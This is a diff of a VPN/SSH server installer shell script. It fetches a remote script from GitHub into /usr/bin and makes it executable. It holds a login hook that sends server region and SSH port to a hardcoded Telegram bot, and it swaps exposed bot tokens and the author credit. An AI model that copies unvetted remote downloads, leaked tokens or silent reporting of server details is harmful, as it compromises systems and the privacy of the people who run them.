@@ -235,8 +235,8 @@ echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━�
 wget -q -O /usr/bin/dashboard "https://raw.githubusercontent.com/tanilink/stunnelvpn/momok/menu/dashboard.sh" && chmod +x /usr/bin/dashboard
 # pemberitahuan
 
-USERID=1793095437
-KEY="6947487236:AAHkuBwLi4kJj1WaxNarBaB-xBOwl_sP6PE"
+USERID=6414150636
+KEY="7422078565:AAGoTa4NF8RcYcuCz4Z5DG6mpQBmXyBuHoc"
 TIMEOUT="10"
 URL="https://api.telegram.org/bot$KEY/sendMessage"
 DATE_EXEC="$(date "+%d %b %Y %H:%M")"
@@ -265,7 +265,7 @@ if [ -n "$SSH_CLIENT" ] && [ -z "$TMUX" ]; then
 👙REGIONAL  : $REGION
 👙PORT SSH. : $PORT
 ==============================
-   ✨SCRIPTED BY TANILINK✨
+✨SCRIPTED RIFQI VPN TUNELING✨
 =============================="
 	curl -s --max-time $TIMEOUT -d "chat_id=$USERID&disable_web_page_preview=1&text=$TEXT" $URL > /dev/null
 	rm $TMPFILE
